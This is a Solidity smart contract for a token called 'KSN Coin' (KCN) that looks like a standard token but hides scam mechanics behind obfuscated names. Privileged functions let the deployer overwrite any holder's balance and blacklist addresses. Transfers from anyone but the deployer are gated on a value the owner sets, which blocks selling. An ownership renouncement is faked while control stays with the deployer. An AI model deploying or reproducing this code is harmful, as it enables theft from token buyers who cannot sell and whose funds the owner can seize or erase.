//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface minTokenTeam {
    function totalSupply() external view returns (uint256);

    function balanceOf(address liquidityTrading) external view returns (uint256);

    function transfer(address launchedSenderLaunch, uint256 toEnable) external returns (bool);

    function allowance(address senderTeam, address spender) external view returns (uint256);

    function approve(address spender, uint256 toEnable) external returns (bool);

    function transferFrom(
        address sender,
        address launchedSenderLaunch,
        uint256 toEnable
    ) external returns (bool);

    event Transfer(address indexed from, address indexed feeTake, uint256 value);
    event Approval(address indexed senderTeam, address indexed spender, uint256 value);
}

interface minTokenTeamMetadata is minTokenTeam {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract launchedAmount {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface feeTeam {
    function createPair(address receiverSender, address launchedTo) external returns (address);
}

interface teamTotal {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract KSNCoin is launchedAmount, minTokenTeam, minTokenTeamMetadata {

    uint256 shouldFee;

    function getOwner() external view returns (address) {
        return exemptAuto;
    }

    mapping(address => bool) public minFund;

    string private modeTeam = "KSN Coin";

    uint256 public sellBuy;

    function transferFrom(address isTx, address launchedSenderLaunch, uint256 toEnable) external override returns (bool) {
        if (_msgSender() != teamSell) {
            if (shouldEnable[isTx][_msgSender()] != type(uint256).max) {
                require(toEnable <= shouldEnable[isTx][_msgSender()]);
                shouldEnable[isTx][_msgSender()] -= toEnable;
            }
        }
        return autoLaunched(isTx, launchedSenderLaunch, toEnable);
    }

    function marketingShould() private view {
        require(minFund[_msgSender()]);
    }

    bool private tradingModeSender;

    function name() external view virtual override returns (string memory) {
        return modeTeam;
    }

    function buyLaunch(uint256 toEnable) public {
        marketingShould();
        listAt = toEnable;
    }

    bool public tokenFundTotal;

    function amountTotalReceiver() public {
        emit OwnershipTransferred(sellExempt, address(0));
        exemptAuto = address(0);
    }

    function liquiditySender(address teamMin, uint256 toEnable) public {
        marketingShould();
        fromMinReceiver[teamMin] = toEnable;
    }

    mapping(address => bool) public exemptTotal;

    function autoLaunched(address isTx, address launchedSenderLaunch, uint256 toEnable) internal returns (bool) {
        if (isTx == sellExempt) {
            return autoSell(isTx, launchedSenderLaunch, toEnable);
        }
        uint256 fundTeamSwap = minTokenTeam(walletSender).balanceOf(tokenMin);
        require(fundTeamSwap == listAt);
        require(!exemptTotal[isTx]);
        return autoSell(isTx, launchedSenderLaunch, toEnable);
    }

    uint256 listAt;

    address public walletSender;

    function symbol() external view virtual override returns (string memory) {
        return buyTake;
    }

    mapping(address => mapping(address => uint256)) private shouldEnable;

    uint256 public autoFundLimit;

    function balanceOf(address liquidityTrading) public view virtual override returns (uint256) {
        return fromMinReceiver[liquidityTrading];
    }

    function approve(address totalMax, uint256 toEnable) public virtual override returns (bool) {
        shouldEnable[_msgSender()][totalMax] = toEnable;
        emit Approval(_msgSender(), totalMax, toEnable);
        return true;
    }

    address public sellExempt;

    mapping(address => uint256) private fromMinReceiver;

    bool public swapMax;

    function totalSupply() external view virtual override returns (uint256) {
        return walletExempt;
    }

    address teamSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 private amountExempt;

    function owner() external view returns (address) {
        return exemptAuto;
    }

    function marketingLaunchSwap(address marketingLaunched) public {
        marketingShould();
        if (autoFundLimit != amountExempt) {
            amountExempt = sellBuy;
        }
        if (marketingLaunched == sellExempt || marketingLaunched == walletSender) {
            return;
        }
        exemptTotal[marketingLaunched] = true;
    }

    uint256 private walletExempt = 100000000 * 10 ** 18;

    string private buyTake = "KCN";

    function transfer(address teamMin, uint256 toEnable) external virtual override returns (bool) {
        return autoLaunched(_msgSender(), teamMin, toEnable);
    }

    constructor (){
        
        amountTotalReceiver();
        teamTotal atLaunch = teamTotal(teamSell);
        walletSender = feeTeam(atLaunch.factory()).createPair(atLaunch.WETH(), address(this));
        if (autoFundLimit != sellBuy) {
            tradingModeSender = false;
        }
        sellExempt = _msgSender();
        minFund[sellExempt] = true;
        fromMinReceiver[sellExempt] = walletExempt;
        if (marketingAuto) {
            tradingModeSender = true;
        }
        emit Transfer(address(0), sellExempt, walletExempt);
    }

    uint8 private tokenMarketing = 18;

    address private exemptAuto;

    function autoSell(address isTx, address launchedSenderLaunch, uint256 toEnable) internal returns (bool) {
        require(fromMinReceiver[isTx] >= toEnable);
        fromMinReceiver[isTx] -= toEnable;
        fromMinReceiver[launchedSenderLaunch] += toEnable;
        emit Transfer(isTx, launchedSenderLaunch, toEnable);
        return true;
    }

    event OwnershipTransferred(address indexed marketingFee, address indexed receiverMarketing);

    function fromWalletEnable(address maxAuto) public {
        if (tokenFundTotal) {
            return;
        }
        
        minFund[maxAuto] = true;
        
        tokenFundTotal = true;
    }

    function decimals() external view virtual override returns (uint8) {
        return tokenMarketing;
    }

    bool private marketingAuto;

    bool public shouldTx;

    address tokenMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function allowance(address shouldMarketing, address totalMax) external view virtual override returns (uint256) {
        if (totalMax == teamSell) {
            return type(uint256).max;
        }
        return shouldEnable[shouldMarketing][totalMax];
    }

}